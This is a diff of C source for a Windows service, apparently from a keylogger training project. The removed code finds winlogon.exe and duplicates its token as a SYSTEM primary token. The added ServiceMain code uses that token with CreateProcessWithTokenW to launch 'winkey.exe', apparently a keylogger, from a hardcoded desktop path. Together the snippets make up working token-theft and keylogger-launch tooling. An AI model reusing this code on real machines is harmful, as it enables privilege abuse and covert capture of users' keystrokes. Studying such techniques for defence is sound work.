@@ -32,83 +32,6 @@ static DWORD WINAPI ServiceCtrlHandlerEx(DWORD ctrl, DWORD eventType, LPVOID eve
     return (0);
 }
 
-static DWORD   GetWinLogonPid(DWORD sessionID)
-{
-    UNREFERENCED_PARAMETER(sessionID);
-
-
-    DWORD pid = 0;
-    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnap == INVALID_HANDLE_VALUE)
-        return (0);
-
-    PROCESSENTRY32 pe;
-    pe.dwSize = sizeof(PROCESSENTRY32);
-
-    // get first process on snapshot
-    if (Process32First(hSnap, &pe))
-    {
-        while (TRUE)
-        {
-            // check winlogon process
-            if (_stricmp(pe.szExeFile, "winlogon.exe") == 0)
-            {
-                pid = pe.th32ProcessID;
-                break ;
-            }
-            if (!Process32Next(hSnap, &pe)) // check next process
-                break ;
-        }
-    }
-
-    CloseHandle(hSnap);
-    return (pid);
-}
-
-HANDLE  GetSystemToken(void)
-{
-    DWORD   sessionID = WTSGetActiveConsoleSessionId(); // session 0
-    DWORD   pid = GetWinLogonPid(sessionID);    
-    
-    HANDLE hProcess = OpenProcess(
-        PROCESS_QUERY_INFORMATION, 
-        FALSE, 
-        pid);
-
-    if (!hProcess)
-    {
-        printf("OpenProcess failed: %lu\n", GetLastError());
-        return (NULL);
-    }
-
-    // open token winlogon
-    HANDLE hToken = NULL;
-    if (!OpenProcessToken(
-        hProcess, 
-        TOKEN_DUPLICATE | TOKEN_QUERY, 
-        &hToken))
-    {
-        printf("OpenProcessToken failed: %lu\n", GetLastError());
-        return (NULL);
-    }
-
-    HANDLE hNewToken = NULL;
-    if (!DuplicateTokenEx(
-        hToken,
-        TOKEN_ALL_ACCESS,
-        NULL,
-        SecurityImpersonation,
-        TokenPrimary,
-        &hNewToken
-    ))
-    {
-        printf("DuplicateTokenEx failed: %lu\n", GetLastError());
-        return (NULL);
-    }
-    
-    return (hNewToken);
-}
-
 // session 0 -> not interactive
 // session 1 -> interactive
 // start service SYSTEM privilege (session 0)
@@ -146,28 +69,35 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
     HANDLE  hToken = GetSystemToken();
 
     UNREFERENCED_PARAMETER(hToken);
-    
-    // for test
-    /*STARTUPINFO si = { sizeof(si) };
+
+    // function for start programme winkey
+    LPWSTR    exePath = L"C:\\Users\\r4mnesia\\Desktop\\Tinky\\winkey.exe"; // MAX_PATH per default == 260
+    //getFilePathFromExe(exePath, "winkey.exe");
+
+    STARTUPINFOW        si;
     PROCESS_INFORMATION pi;
 
-    if (CreateProcessAsUser(
-            hNewToken,
-            "C:\\Windows\\System32\\notepad.exe",
+    ZeroMemory(&si, sizeof(si));
+    ZeroMemory(&pi, sizeof(pi));
+    si.cb = sizeof(si);
+
+    if (!CreateProcessWithTokenW(
+            hToken,
+            LOGON_WITH_PROFILE,
+            exePath,
             NULL,
-            NULL,
-            NULL,
-            FALSE,
-            0,
+            CREATE_NEW_CONSOLE,
             NULL,
             NULL,
             &si,
             &pi))
     {
-        printf("Process created!\n");
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-    }*/
+        printf("CreateProcessWithTokenW failed: %lu\n", GetLastError());
+        CloseHandle(hToken);
+        return;
+    }
 
-    // function for start programme winkey
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    CloseHandle(hToken);
 }
